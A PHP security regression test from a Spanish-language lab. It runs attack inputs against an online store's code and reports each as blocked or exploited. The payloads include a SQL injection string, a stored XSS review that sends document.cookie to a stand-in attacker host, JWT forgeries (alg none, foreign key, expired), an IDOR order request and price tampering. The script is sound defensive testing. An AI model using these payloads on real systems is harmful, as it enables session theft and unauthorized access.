<?php
// Pruebas de abuso del laboratorio PER.
// Uso: php tests/pruebas_abuso.php antes   |   php tests/pruebas_abuso.php src
// Cada prueba intenta explotar un hallazgo de la Fase I. "BLOQUEADO" = el control funcionó.

$dir = $argv[1] ?? 'src';
spl_autoload_register(function ($c) {   // carga de firebase/php-jwt sin Composer (solo laboratorio)
    $f = __DIR__ . '/../vendor-lab/php-jwt/' . basename(str_replace('\\', '/', $c)) . '.php';
    if (is_file($f)) { require_once $f; }
});
foreach (['Busqueda', 'Resenas', 'Token', 'Pedidos', 'Carrito'] as $m) {
    require_once __DIR__ . "/../$dir/$m.php";
}
use Firebase\JWT\JWT;

// Base de datos de prueba en memoria
$db = new PDO('sqlite::memory:', null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$db->exec("CREATE TABLE productos (sku TEXT, nombre TEXT, precio REAL)");
$db->exec("INSERT INTO productos VALUES ('P-1','Audífonos',150.00),('P-2','Teclado',300.00),('P-3','Monitor',1200.00)");
$db->exec("CREATE TABLE resenas (sku TEXT, autor TEXT, comentario TEXT)");
$db->exec("INSERT INTO resenas VALUES ('P-1','Ana','<script>fetch(\"//atacante.test/?c=\"+document.cookie)</script>')");
$db->exec("CREATE TABLE pedidos (id INTEGER, cliente_id INTEGER, total REAL)");
$db->exec("INSERT INTO pedidos VALUES (1001, 1, 450.00),(1002, 2, 1200.00)");

// Llaves RSA de prueba (en producción las emite Amazon Cognito)
$k = openssl_pkey_new(['private_key_bits' => 2048, 'private_key_type' => OPENSSL_KEYTYPE_RSA]);
openssl_pkey_export($k, $priv);
$pub = openssl_pkey_get_details($k)['key'];
$otra = openssl_pkey_new(['private_key_bits' => 2048, 'private_key_type' => OPENSSL_KEYTYPE_RSA]);
openssl_pkey_export($otra, $privOtra);
$base = ['iss' => 'https://cognito-idp.us-east-1.amazonaws.com/per-usuarios', 'aud' => 'per-tienda-web',
         'sub' => 1, 'iat' => time(), 'exp' => time() + 900];
$b64 = fn($x) => rtrim(strtr(base64_encode(json_encode($x)), '+/', '-_'), '=');
$leer = fn($t) => $dir === 'antes' ? usuarioDesdeToken($t) : usuarioDesdeToken($t, $pub);

$r = [];
// 1. Inyección SQL (R-05)
$filas = buscarProductos($db, "' OR 1=1 --");
$r[] = ['SQLi en búsqueda (R-05)', "' OR 1=1 --", count($filas) === 0, count($filas) . ' productos devueltos'];
// 2. XSS almacenado (R-06)
ob_start(); $html = mostrarResenas($db, 'P-1'); ob_end_clean();
$r[] = ['XSS almacenado en reseñas (R-06)', 'reseña con <script>', !str_contains($html, '<script>'),
        str_contains($html, '<script>') ? 'script se ejecutaría' : 'script mostrado como texto'];
// 3. JWT con alg "none" (R-08)
$none = $b64(['alg' => 'none', 'typ' => 'JWT']) . '.' . $b64(['sub' => 2] + $base) . '.';
$u = $leer($none);
$r[] = ['JWT sin firma, alg none (R-08)', 'token falsificado', $u === null, $u ? 'aceptado como cliente ' . $u['sub'] : 'rechazado'];
// 4. JWT firmado con otra llave (R-08)
$falso = JWT::encode(['sub' => 2] + $base, $privOtra, 'RS256');
$u = $leer($falso);
$r[] = ['JWT firmado por un atacante (R-08)', 'llave privada ajena', $u === null, $u ? 'aceptado como cliente ' . $u['sub'] : 'rechazado'];
// 5. JWT vencido (R-08)
$vencido = JWT::encode(['exp' => time() - 3600] + $base, $priv, 'RS256');
$u = $leer($vencido);
$r[] = ['JWT vencido hace 1 hora (R-08)', 'exp en el pasado', $u === null, $u ? 'aceptado' : 'rechazado'];
// 6. BOLA/IDOR (R-09)
$cliente1 = $leer(JWT::encode($base, $priv, 'RS256')) ?? ['sub' => 1];
$p = obtenerPedido($db, 1002, $cliente1);
$r[] = ['BOLA: cliente 1 pide el pedido 1002 (R-09)', 'pedido de otro cliente', $p === null,
        $p ? 've el pedido de cliente ' . $p['cliente_id'] : 'no se entrega'];
// 7. Manipulación de precio (R-10)
$_POST['precio'] = '0.01';
$total = calcularTotal($db, ['sku' => 'P-3', 'cantidad' => 2, 'precio' => '0.01']);
$r[] = ['Precio alterado en el carrito (R-10)', 'precio 0.01 en vez de 1200', abs($total - 2400) < 0.001, 'total cobrado US$' . number_format($total, 2)];
// 8. Control funcional: un token válido sigue funcionando
$ok = $leer(JWT::encode($base, $priv, 'RS256'));
$r[] = ['Control funcional: token válido', 'token legítimo', $ok !== null && (int)$ok['sub'] === 1, $ok ? 'aceptado' : 'rechazado'];

$bloq = 0;
$col = fn($t, $n) => $t . str_repeat(' ', max(0, $n - mb_strlen($t)));   // relleno que respeta tildes
echo $col('Prueba', 44) . ' | ' . $col('Entrada', 27) . ' | ' . $col('Resultado', 9) . " | Detalle\n";
foreach ($r as [$n, $e, $paso, $d]) {
    $bloq += $paso ? 1 : 0;
    $res = str_starts_with($n, 'Control') ? ($paso ? 'FUNCIONA' : 'FALLA') : ($paso ? 'BLOQUEADO' : 'EXPLOTADO');
    echo $col($n, 44) . ' | ' . $col($e, 27) . ' | ' . $col($res, 9) . " | $d\n";
}
echo "\nVersión '$dir': $bloq de " . count($r) . " pruebas superadas\n";
exit($bloq === count($r) ? 0 : 1);
